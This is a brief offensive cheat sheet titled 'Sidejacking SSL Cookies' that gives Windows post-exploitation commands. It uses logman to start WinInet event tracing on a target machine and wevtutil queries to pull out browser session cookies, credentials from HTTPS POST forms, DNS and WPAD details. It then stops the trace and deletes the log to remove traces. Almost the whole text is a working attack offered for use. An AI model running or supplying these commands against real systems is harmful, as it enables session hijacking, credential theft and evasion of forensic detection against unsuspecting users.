# Sidejacking SSL Cookies

Activate the event tracing for the WinInet process. Wait for the target to do web browsing activity.

```
C:\> logman.exe start CookieStealer -p Microsoft-Windows-WinInet -o C:\temp\cookiesteal.etl -ets
```

Steal the cookies.

```
C:\> wevtutil.exe qe C:\temp\cookiesteal.etl /lf:true /f:Text | find.exe /i "cookie added"
```

Steal credentials from HTTPS form websites via HTTP POST request.

```
C:\> wevtutil.exe qe C:\temp\cookiesteal.etl /lf:true /f:Text | find.exe /i "POST"
```

Monitor activities for additional information such as, DNS requests, Proxy information, DNS Cache snooping and more.

```
C:\> wevtutil.exe qe C:\temp\cookiesteal.etl /lf:true /f:Text | find.exe /i "hostname"

C:\> wevtutil.exe qe C:\temp\cookiesteal.etl /lf:true /f:Text | find.exe /i "WPAD"

C:\> wevtutil.exe qe C:\temp\cookiesteal.etl /lf:true /f:Text | find.exe /i "DNS Cache"
```

Once you've collected for what you're looking for deactivate event logging and delete the cookie.

```
C:\> logman.exe stop CookieStealer -ets

C:\> del C:\temp\cookiesteal.etl
```

---
## References

- [Security Weekly: Sidejacking SSL Cookies (and more) with ETW â€“ Post Exploitation](https://www.scmagazine.com/sw-article/sidejacking-ssl-cookies-and-more-with-etw-post-exploitation)